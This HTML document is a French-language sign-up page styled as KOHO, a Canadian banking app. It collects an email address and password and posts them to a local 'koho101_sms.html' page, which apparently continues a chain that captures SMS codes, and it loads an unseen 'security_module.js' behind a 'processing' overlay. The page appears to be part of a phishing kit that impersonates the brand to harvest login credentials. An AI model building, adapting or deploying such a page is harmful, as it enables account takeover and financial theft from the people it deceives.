<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KOHO - Rejoignez 2.5+ millions de Canadiens sur KOHO</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: white; margin: 0; color: #1a1a1a; }
        .k-header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #f0f0f0; }
        .k-logo { color: #3b1b6e; font-weight: 900; font-size: 24px; letter-spacing: -1px; display: flex; align-items: center; }
        .k-lang { display: flex; align-items: center; gap: 8px; font-weight: 500; font-size: 15px; color: #555; }
        .k-lang span { text-decoration: underline; text-underline-offset: 4px; color: #333; }
        
        .k-container { padding: 30px 20px; max-width: 400px; margin: 0 auto; }
        .k-title { font-size: 28px; font-weight: 800; line-height: 1.2; margin: 0 0 15px 0; letter-spacing: -0.5px; color: #222; }
        .k-subtitle { font-size: 16px; color: #666; margin: 0 0 30px 0; }
        
        .k-input-wrapper { position: relative; margin-bottom: 20px; }
        .k-input { width: 100%; border: 1px solid #dcdcdc; padding: 18px 15px; box-sizing: border-box; border-radius: 12px; font-size: 16px; outline: none; transition: border-color 0.2s; color: #333; }
        .k-input:focus { border-color: #3b1b6e; }
        .k-eye { position: absolute; right: 15px; top: 18px; color: #666; font-size: 18px; cursor: pointer; }
        
        .k-btn { width: 100%; background: #f2f2f2; color: #aaa; border: none; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: all 0.2s; }
        form:valid .k-btn { background: #000; color: white; }
        
        .k-divider { display: flex; align-items: center; text-align: center; margin: 30px 0; color: #666; font-size: 13px; font-weight: bold; }
        .k-divider::before, .k-divider::after { content: ''; flex: 1; border-bottom: 1px solid #e0e0e0; }
        .k-divider:not(:empty)::before { margin-right: 15px; }
        .k-divider:not(:empty)::after { margin-left: 15px; }
        
        .k-social-btn { width: 100%; background: #f2f2f2; color: #111; border: none; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: bold; display: flex; justify-content: center; align-items: center; gap: 10px; cursor: pointer; margin-bottom: 25px; }
        
        .k-footer-text { text-align: center; font-size: 15px; color: #555; }
        .k-footer-text a { color: #431f7a; font-weight: bold; text-decoration: none; }
        
        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #3b1b6e;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #3b1b6e; margin: 20px auto; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 40px; text-align: center; }
    </style>
</head>
<body>
    <div class="k-header">
        <div class="k-logo">KOHO</div>
        <div class="k-lang"><i class="fa-solid fa-earth-americas" style="font-size: 18px;"></i> <span>EN</span></div>
    </div>
    
    <div class="k-container">
        <h1 class="k-title">Rejoignez 2.5+ millions de Canadiens sur KOHO</h1>
        
        <p class="k-subtitle">Lancez-vous en moins de 3 minutes.</p>
        <form action="koho101_sms.html" method="POST">
            <div class="k-input-wrapper">
                <input type="email" name="email" id="email" class="k-input" placeholder="Adresse courriel" required>
            </div>
            
            <div class="k-input-wrapper">
                <input type="password" name="password" id="password" class="k-input" placeholder="Mot de passe" required>
                <i class="fa-regular fa-eye k-eye"></i>
            </div>
            
            <button type="submit" class="k-btn">Suivant</button>
        </form>
        
        <div class="k-divider">OU</div>
        
        <button class="k-social-btn">
            <!-- Google Logo SVG -->
            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="18px" height="18px" viewBox="0 0 48 48">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
                <path fill="none" d="M0 0h48v48H0z"></path>
            </svg>
            Continuer avec Google
        </button>
        
        <div class="k-footer-text">
            Vous avez d&eacute;j&agrave; un compte ? <a href="#">Connectez-vous ici</a>
        </div>

    </div>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Traitement en cours...</p>
    </div>

    
<script src="security_module.js"></script>
</body>
</html>
